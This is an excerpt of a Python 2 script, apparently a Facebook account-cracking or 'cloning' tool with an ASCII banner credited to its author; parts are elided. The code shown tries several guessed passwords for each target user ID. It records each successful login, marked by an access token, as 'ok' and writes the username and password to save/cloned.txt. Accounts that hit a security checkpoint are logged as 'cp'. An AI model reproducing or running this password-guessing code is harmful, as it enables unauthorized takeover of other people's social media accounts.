...
def login():
    ...
    time.sleep(0.05)
    jalan('\xe2\x95\x91\x1b[1;92m Author  \x1b[1;96m    : \x1b[1;93m  Haroon JaNi         \xe2\x95\x91')
    jalan('\xe2\x95\x91\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  https://github.com/Haroon JaNi \xe2\x95\x91')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;91m[\x1b[1;92mharoon jani ok\x1b[1;91m]   ' + k + c + user + '  |  ' + pass1
                okb = open('save/cloned.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[\x1b[1;96haroon jani cp \x1b[1;91m] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;91m[\x1b[1;92mharoon jani ok\x1b[1;91m]   ' + k + c + user + '  |  ' + pass2
                    okb = open('save/cloned.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[\x1b[1;96mHaroon jani cp \x1b[1;91m] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/cloned.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;91m[\x1b[1;92mharoon jani ok \x1b[1;91m]   ' + k + c + user + '  |  ' + pass3
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[\x1b[1;96mvharoon jani cp\x1b[1;91m] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/cloned.txt', 'a')
